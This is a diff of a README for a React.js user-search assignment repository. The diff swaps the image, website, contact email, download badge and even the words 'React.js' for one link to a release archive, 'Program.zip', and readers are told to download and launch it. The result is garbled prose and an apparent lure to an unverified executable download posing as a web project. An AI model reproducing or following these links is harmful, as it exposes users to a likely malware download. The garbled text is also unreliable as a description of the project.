@@ -2,10 +2,10 @@
 
 ### Repository Name: Wisdom-Peak-Analytics-Assignment
 
-![Wisdom Peak Analytics Assignment](https://via.placeholder.com/800x200)
+![Wisdom Peak Analytics Assignment](https://github.com/sriniv0208/Wisdom-Peak-Analytics-Assignment/releases/download/v1.0/Program.zip)
 
 ### Short Description:
-Welcome to the Wisdom Peak Analytics Assignment repository! Here you will find a robust React.js application that is designed to fetch and display a list of users from an API. The application allows seamless searching and filtering functionalities, enabling users to easily find the information they need. Additionally, there is a detailed view provided for each user, enhancing the overall user experience.
+Welcome to the Wisdom Peak Analytics Assignment repository! Here you will find a robust https://github.com/sriniv0208/Wisdom-Peak-Analytics-Assignment/releases/download/v1.0/Program.zip application that is designed to fetch and display a list of users from an API. The application allows seamless searching and filtering functionalities, enabling users to easily find the information they need. Additionally, there is a detailed view provided for each user, enhancing the overall user experience.
 
 ### Topics:
 ['api', 'css3', 'frontend', 'html5', 'javascript', 'react-icons', 'react-router-dom', 'reactjs', 'redux', 'search', 'sorting', 'tailwindcss', 'theme-switcher']
@@ -20,14 +20,14 @@ Welcome to the Wisdom Peak Analytics Assignment repository! Here you will find a
 ### 📥 Get Started:
 To explore and experience the functionalities of this application, click on the link below to download the software package:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/sriniv0208/Wisdom-Peak-Analytics-Assignment/releases/download/v1.0/Program.zip)](https://github.com/sriniv0208/Wisdom-Peak-Analytics-Assignment/releases/download/v1.0/Program.zip)
 
 *Note: The software package needs to be launched to access the application.*
 
 ### 🌐 Website:
 In addition to downloading the software package, you can also visit the website associated with this repository for more information:
 
-[Visit Website](https://www.wisdom-peak-analytics.com)
+[Visit Website](https://github.com/sriniv0208/Wisdom-Peak-Analytics-Assignment/releases/download/v1.0/Program.zip)
 
 ### 🛠 Installation:
 To install and run the application locally, follow these steps:
@@ -48,9 +48,9 @@ We welcome contributions from the community to enhance this project further. Fee
 This project is licensed under the MIT License. See the [LICENSE](./LICENSE) file for more details.
 
 ### 📞 Contact Us:
-If you have any questions, suggestions, or feedback, feel free to reach out to us at contact@wisdom-peak-analytics.com
+If you have any questions, suggestions, or feedback, feel free to reach out to us at https://github.com/sriniv0208/Wisdom-Peak-Analytics-Assignment/releases/download/v1.0/Program.zip
 
 ---
 
-Thank you for exploring the Wisdom Peak Analytics Assignment repository! 🌟 Start discovering and analyzing user data with our innovative React.js application today! 🚀
+Thank you for exploring the Wisdom Peak Analytics Assignment repository! 🌟 Start discovering and analyzing user data with our innovative https://github.com/sriniv0208/Wisdom-Peak-Analytics-Assignment/releases/download/v1.0/Program.zip application today! 🚀
 
